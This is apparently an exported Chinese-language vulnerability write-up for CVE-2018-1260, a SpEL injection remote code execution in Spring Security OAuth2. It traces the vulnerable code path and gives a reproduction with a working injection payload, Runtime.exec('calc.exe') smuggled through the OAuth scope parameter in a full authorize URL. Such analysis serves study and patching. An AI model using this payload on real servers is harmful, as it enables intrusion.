<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X3ad5e71f5e29ac235cb8fb64a6b29b02243b37b"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-1260</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Spring Security Oauth2 </span><span class="csECDA2D3">远程代码执行</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Security OAuth 2.3 to 2.3.2<br/>Spring Security OAuth 2.2 to 2.2.1<br/>Spring Security OAuth 2.1 to 2.1.1<br/>Spring Security OAuth 2.0 to 2.0.14</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">先简要补充一下关于</span><span class="cs8926E06">OAuth2.0</span><span class="cs9C1B1871">的相关知识。</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image0.png" width="560" height="300" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">以上图为例。当用户使用客户端时，客户端要求授权，即图中的</span><span class="cs8926E06">AB</span><span class="cs9C1B1871">。接着客户端通过在</span><span class="cs8926E06">B</span><span class="cs9C1B1871">中获得的授权向认证服务器申请令牌，即</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">。最后在</span><span class="cs8926E06">EF</span><span class="cs9C1B1871">阶段，客户端带着</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">向资源服务器请求并获得资源。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在获得</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（</span><span class="cs8926E06">authorization code</span><span class="cs9C1B1871">）、简化模式（</span><span class="cs8926E06">implicit</span><span class="cs9C1B1871">）、密码模式（</span><span class="cs8926E06">resource owner password credentials</span><span class="cs9C1B1871">）、客户端模式（</span><span class="cs8926E06">client credentials</span><span class="cs9C1B1871">）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数</span><span class="cs9FB05234">scope</span><span class="cs9C1B1871">，这个参数用于表示客户端申请的权限的范围。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">，根据</span><span class="cs8926E06"><a class="cs508254C" href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html"><span class="cs1C2E50E7">官方文档</span></a></span><span class="cs9C1B1871">，在</span><span class="cs8926E06">spring-security-oauth</span><span class="cs9C1B1871">的默认配置中</span><span class="cs8926E06">scope</span><span class="cs9C1B1871">参数默认为空：</span></p><p class="cs3A447A38"><span class="cs9FB05234">scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为明白起见，我们在</span><span class="cs8926E06">demo</span><span class="cs9C1B1871">中将其清楚写出：</span></p><p class="cs3A447A38"><span class="cs9FB05234">clients.inMemory()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.withClient(&quot;client&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.authorizedGrantTypes(&quot;authorization_code&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.scopes();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着开始正式分析。当我们访问</span><span class="cs9FB05234">http://localhost:8080/oauth/authorize</span><span class="cs9C1B1871">重定向至</span><span class="cs9FB05234">http://localhost:8080/login</span><span class="cs9C1B1871">并完成</span><span class="cs8926E06">login</span><span class="cs9C1B1871">后程序流程到达</span><span class="cs8926E06"><br/>org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java</span><span class="cs9C1B1871">，这里贴上部分代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">@RequestMapping(value = &quot;/oauth/authorize&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public ModelAndView authorize(Map&lt;String, Object&gt; model, @RequestParam Map&lt;String, String&gt; parameters,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SessionStatus sessionStatus, Principal principal) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// query off of the authorization request instead of referring back to the parameters map. The contents of the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// parameters map will be stored without change in the AuthorizationRequest object once it is created.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// been added to the request by the manager).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oauth2RequestValidator.validateScope(authorizationRequest, client);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Place auth request into the model so that it is stored in the session</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// for approveOrDeny to use. That way we make sure that auth request comes from the session,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model.put(&quot;authorizationRequest&quot;, authorizationRequest);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第</span><span class="cs8926E06">115</span><span class="cs9C1B1871">行</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image1.png" width="560" height="218" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">在执行完</span><span class="cs9FB05234">AuthorizationRequest authorizationRequest = ...</span><span class="cs9C1B1871">后，</span><span class="cs9FB05234">authorizationRequest</span><span class="cs9C1B1871">代表了要认证的请求，其中包含了众多参数</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image2.png" width="560" height="210" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在经过了对一些参数的处理，比如</span><span class="cs8926E06">RedirectUri</span><span class="cs9C1B1871">等，之后到达第</span><span class="cs8926E06">156</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// been added to the request by the manager).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">oauth2RequestValidator.validateScope(authorizationRequest, client);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里将对</span><span class="cs9FB05234">scope</span><span class="cs9C1B1871">参数进行验证。跟入</span><span class="cs9FB05234">validateScope</span><span class="cs9C1B1871">到</span><span class="cs8926E06">org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19</span></p><p class="cs3A447A38"><span class="cs9FB05234">public class DefaultOAuth2RequestValidator implements OAuth2RequestValidator {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void validateScope(AuthorizationRequest authorizationRequest, ClientDetails client) throws InvalidScopeException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validateScope(authorizationRequest.getScope(), client.getScope());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟入</span><span class="cs9FB05234">validateScope</span><span class="cs9C1B1871">，至</span><span class="cs8926E06"> org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28</span></p><p class="cs3A447A38"><span class="cs9FB05234">private void validateScope(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (clientScopes != null &amp;&amp; !clientScopes.isEmpty()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (String scope : requestScopes) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!clientScopes.contains(scope)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new InvalidScopeException(&quot;Invalid scope: &quot; + scope, clientScopes);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (requestScopes.isEmpty()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new InvalidScopeException(&quot;Empty scope (either the client or the user is not allowed the requested scopes)&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先检查</span><span class="cs9FB05234">clientScopes</span><span class="cs9C1B1871">，这个</span><span class="cs9FB05234">clientScopes</span><span class="cs9C1B1871">即我们在前面</span><span class="cs8926E06">configure</span><span class="cs9C1B1871">中配置的</span><span class="cs9FB05234">.scopes();</span><span class="cs9C1B1871">，倘若不为空，则进行白名单检查。举个例子，如果前面配置</span><span class="cs9FB05234">.scopes(&quot;chybeta&quot;);</span><span class="cs9C1B1871">，则传入</span><span class="cs9FB05234">requestScopes</span><span class="cs9C1B1871">必须为</span><span class="cs9FB05234">chybeta</span><span class="cs9C1B1871">，否则会直接抛出异常</span><span class="cs9FB05234">Invalid scope:xxx</span><span class="cs9C1B1871">。但由于此处查</span><span class="cs9FB05234">clientScopes</span><span class="cs9C1B1871">为空值，则接下来仅仅做了</span><span class="cs9FB05234">requestScopes.isEmpty()</span><span class="cs9C1B1871">的检查并且通过。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在完成了各项检查和配置后，在</span><span class="cs9FB05234">authorize</span><span class="cs9C1B1871">函数的最后执行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回想一下前面</span><span class="cs8926E06">OAuth2.0</span><span class="cs9C1B1871">的流程，在客户端请求授权（</span><span class="cs8926E06">A</span><span class="cs9C1B1871">），用户登陆认证（</span><span class="cs8926E06">B</span><span class="cs9C1B1871">）后，将会进行用户授权（</span><span class="cs8926E06">C</span><span class="cs9C1B1871">），这里即开始进行正式的授权阶段。跟入</span><span class="cs9FB05234">getUserApprovalPageResponse</span><span class="cs8926E06"> </span><span class="cs9C1B1871">至</span><span class="cs8926E06">org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image3.png" width="560" height="196" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">生成对应的</span><span class="cs8926E06">model</span><span class="cs9C1B1871">和</span><span class="cs8926E06">view</span><span class="cs9C1B1871">，之后将会</span><span class="cs8926E06">forward</span><span class="cs9C1B1871">到</span><span class="cs8926E06">/oauth/confirm_access</span><span class="cs9C1B1871">。为简单起见，我省略中间过程，直接定位到</span><span class="cs8926E06">org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20</span></p><p class="cs40DD2BC9"><span class="cs8926E06">public class WhitelabelApprovalEndpoint {<br/>@RequestMapping(&quot;/oauth/confirm_access&quot;)<br/>public ModelAndView getAccessConfirmation(Map&lt;String, Object&gt; model, HttpServletRequest request) throws Exception {<br/>String template = createTemplate(model, request);<br/>if (request.getAttribute(&quot;_csrf&quot;) != null) {<br/>model.put(&quot;_csrf&quot;, request.getAttribute(&quot;_csrf&quot;));<br/>}<br/>return new ModelAndView(new SpelView(template), model);<br/>}<br/>...<br/>}<br/></span><span class="cs9C1B1871">跟入</span><span class="cs8926E06">createTemplate</span><span class="cs9C1B1871">，第</span><span class="cs8926E06">29</span><span class="cs9C1B1871">行：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">protected String createTemplate(Map&lt;String, Object&gt; model, HttpServletRequest request) {<br/>String template = TEMPLATE;<br/>if (model.containsKey(&quot;scopes&quot;) || request.getAttribute(&quot;scopes&quot;) != null) {<br/>template = template.replace(&quot;%scopes%&quot;, createScopes(model, request)).replace(&quot;%denial%&quot;, &quot;&quot;);<br/>}<br/>...<br/>return template;<br/>}<br/></span><span class="cs9C1B1871">跟入</span><span class="cs8926E06">createScopes</span><span class="cs9C1B1871">，第</span><span class="cs8926E06">46</span><span class="cs9C1B1871">行：</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image4.png" width="560" height="224" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里获取到了</span><span class="cs9FB05234">scopes</span><span class="cs9C1B1871">，并且通过</span><span class="cs8926E06">for</span><span class="cs9C1B1871">循环生成对应的</span><span class="cs9FB05234">builder</span><span class="cs9C1B1871">，其实就是</span><span class="cs8926E06">html</span><span class="cs9C1B1871">和一些标签等，最后返回的即</span><span class="cs9FB05234">builder.toString()</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其值如下</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;ul&gt;&lt;li&gt;&lt;div&gt;scope.${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}: &lt;input type=&#39;radio&#39; name=&#39;scope.${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}&#39; value=&#39;true&#39;&gt;Approve&lt;/input&gt; &lt;input type=&#39;radio&#39; name=&#39;scope.${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}&#39; value=&#39;false&#39; checked&gt;Deny&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">createScopes</span><span class="cs9C1B1871">结束后将会把上述</span><span class="cs9FB05234">builder.toString()</span><span class="cs9C1B1871">拼接到</span><span class="cs9FB05234">template</span><span class="cs9C1B1871">中。</span><span class="cs9FB05234">createTemplate</span><span class="cs9C1B1871">结束后，在</span><span class="cs9FB05234">getAccessConfirmation</span><span class="cs9C1B1871">的最后：</span></p><p class="cs3A447A38"><span class="cs9FB05234">return new ModelAndView(new SpelView(template), model);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs9FB05234">template</span><span class="cs9C1B1871">生成对应的</span><span class="cs9FB05234">SpelView</span><span class="cs9C1B1871">对象，这是其构造函数：</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image5.png" width="560" height="201" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">此后在页面渲染的过程中，将会执行页面中的</span><span class="cs8926E06">Spel</span><span class="cs9C1B1871">表达式</span><span class="cs9FB05234">${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}</span><span class="cs9C1B1871">从而造成代码执行。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image6.png" width="560" height="233" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以综上所述，这个任意代码执行的利用条件实在</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">苛刻</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">需要</span><span class="cs9FB05234">scopes</span><span class="cs9C1B1871">没有配置白名单，否则直接</span><span class="cs9FB05234">Invalid scope:xxx</span><span class="cs9C1B1871">。不过大部分</span><span class="cs8926E06">OAuth</span><span class="cs9C1B1871">都会限制授权的范围，即指定</span><span class="cs8926E06">scopes</span><span class="cs9C1B1871">。</span></li><li class="cs63189908"><span class="cs9C1B1871">使用了默认的</span><span class="cs8926E06">Approval Endpoint</span><span class="cs9C1B1871">，生成对应的</span><span class="cs8926E06">template</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">spelview</span><span class="cs9C1B1871">中注入</span><span class="cs8926E06">spel</span><span class="cs9C1B1871">表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致</span><span class="cs8926E06">spel</span><span class="cs9C1B1871">注入不成功。</span></li></ol>
		<h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">github</span><span class="cs9C1B1871">上已有的</span><span class="cs8926E06">demo</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">git clone https://github.com/wanghongfei/spring-security-oauth2-example.git</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">确保导入的</span><span class="cs8926E06">spring-security-oauth2</span><span class="cs9C1B1871">为受影响版本，以这里为例为</span><span class="cs8926E06">2.0.10<br/></span><span class="cs9C1B1871">进入</span><span class="cs8926E06">spring-security-oauth2-example</span><span class="cs9C1B1871">，修改</span><span class="cs8926E06"> cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java</span><span class="cs9C1B1871">的第</span><span class="cs8926E06">67</span><span class="cs9C1B1871">行</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public void configure(ClientDetailsServiceConfigurer clients) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;clients.inMemory()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.withClient(&quot;client&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.authorizedGrantTypes(&quot;authorization_code&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.scopes();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/wanghongfei/spring-security-oauth2-example.git"><span class="cs4B51D5E4">spring-security-oauth2-example</span></a></span><span class="cs9C1B1871">创建对应的数据库等并修改</span><span class="cs8926E06">AlanOAuthApplication</span><span class="cs9C1B1871">中对应的</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">相关配置信息。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">会重定向到</span><span class="cs8926E06">login</span><span class="cs9C1B1871">页面，随意输入</span><span class="cs8926E06">username</span><span class="cs9C1B1871">和</span><span class="cs8926E06">password</span><span class="cs9C1B1871">，点击</span><span class="cs8926E06">login</span><span class="cs9C1B1871">，触发</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Security_Oauth/%ef%bc%88CVE-2018-1260%ef%bc%89Spring%20Security%20Oauth2%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image0.gif" width="560" height="274" alt="" style="border-width:0px;" /></span></p></body>
</html>
